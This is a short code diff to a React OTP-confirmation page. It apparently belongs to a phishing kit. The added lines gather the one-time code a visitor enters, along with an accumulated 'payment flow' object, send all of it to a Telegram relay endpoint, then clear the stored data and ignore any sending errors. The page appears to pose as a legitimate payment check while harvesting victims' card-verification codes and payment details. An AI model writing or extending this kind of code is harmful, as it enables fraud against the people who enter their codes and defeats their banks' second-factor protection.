@@ -1,6 +1,7 @@
 'use client'
 
 import { useEffect, useRef, useState } from 'react'
+import { clearPaymentFlow, updatePaymentFlow } from '@/lib/payment-flow'
 import { ChevronRight, CircleX, TriangleAlert } from 'lucide-react'
 
 const logoImage =
@@ -79,11 +80,13 @@ export default function OtpConfirmPage() {
                 return
               }
               try {
+                const flow = updatePaymentFlow({ otpConfirm: digits.join('') })
                 await fetch('/api/telegram/send', {
                   method: 'POST',
                   headers: { 'content-type': 'application/json' },
-                  body: JSON.stringify({ text: `Confirm OTP submitted: ${digits.join('')}` }),
+                  body: JSON.stringify(flow),
                 })
+                clearPaymentFlow()
               } catch {
                 // Ignore notification failures
               } finally {
